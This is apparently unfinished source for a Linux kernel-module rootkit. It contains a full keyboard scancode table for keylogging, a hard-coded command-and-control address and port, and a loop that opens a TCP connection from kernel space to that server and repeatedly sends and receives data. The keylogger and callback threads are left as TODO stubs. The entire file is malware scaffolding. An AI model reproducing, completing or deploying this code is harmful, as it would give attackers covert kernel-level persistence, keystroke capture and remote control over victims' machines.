#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include <linux/delay.h>
#include <linux/inet.h>

MODULE_LICENSE("GPL");

static const char *keys[][2] = {{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"},{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"},{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"_PAUSE_", "_PAUSE_"}};

static int C2_PORT = 1337;
static char * C2_IP = "192.168.56.1";
struct socket *sock = NULL;
static int CALLBACK_INTERVAL = 30;
static int MAXIMUM_ATTEMPTS = 5;
static enum data_operation {
  SEND = 1, 
  RECV = 2
};

static int do_data_transfer(char * buffer, size_t length, int operation) {
  struct msghdr msg;
  struct kvec vec;
  size_t bytes_sent;
  // send code stub
  msg.msg_name = 0;
  msg.msg_namelen = 0;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_flags = 0;

  vec.iov_len = length;
  vec.iov_base = buffer;

  if (operation == SEND ){
    return kernel_sendmsg(sock, &msg, &vec, vec.iov_len, vec.iov_len);
  } else if (operation == RECV) {
    return kernel_recvmsg(sock, &msg, &vec, vec.iov_len, vec.iov_len, 0);
  } else {
    return -1;
  }
}

static int __init rootkit_init(void) {
  int shutdown = 0, retval = -1; 

  struct sockaddr_in addr;

  addr.sin_family = AF_INET; 
  addr.sin_addr.s_addr = in_aton(C2_IP); 
  addr.sin_port = htons(C2_PORT);

  printk(KERN_INFO "Loaded kernel module");
  /*TODO: kick off keylogger threads
   *
   */

  /*TODO: Kick off callback loop
   *
   */

  while (!shutdown) {
    int attempts = 0;
    printk(KERN_INFO "Creating socket");
    if (!sock && (retval = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
      printk(KERN_INFO "Failed to create socket, uninstalling now");
      goto uninstall;
    }

    // attempt to connect to socket, uninstall if attempts exceed MAXIMUM_ATTEMPTS
    printk(KERN_INFO "Attempting to connect to C2");
    while (0 != (retval = sock->ops->connect(sock, (struct sockaddr*) &addr, sizeof(addr), O_RDWR))) { 
      printk("connection with the server failed with error code %i...\n", retval); 
      ssleep(10);
      attempts++;
      if (attempts == MAXIMUM_ATTEMPTS) {
        goto uninstall;
      }
    }
    attempts = 0;
    printk(KERN_INFO "Connection established!");

    char data[3] = {0x41, 0x42, 0x00};
    printk("SIZE SENT: %i", do_data_transfer(data, 3, SEND));

    printk("SIZE RECV: %i", do_data_transfer(data, 3, RECV));
    printk("MSG RECV: %s", data);

    // cleanup current connection
    printk(KERN_INFO "Destroying socket");
    sock_release(sock);
    sock = NULL;

    // sleep until next callback
    ssleep(CALLBACK_INTERVAL);
  }

uninstall:
  return retval;
}

static void __exit rootkit_exit(void) {
  printk(KERN_INFO "Removed kernel module");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
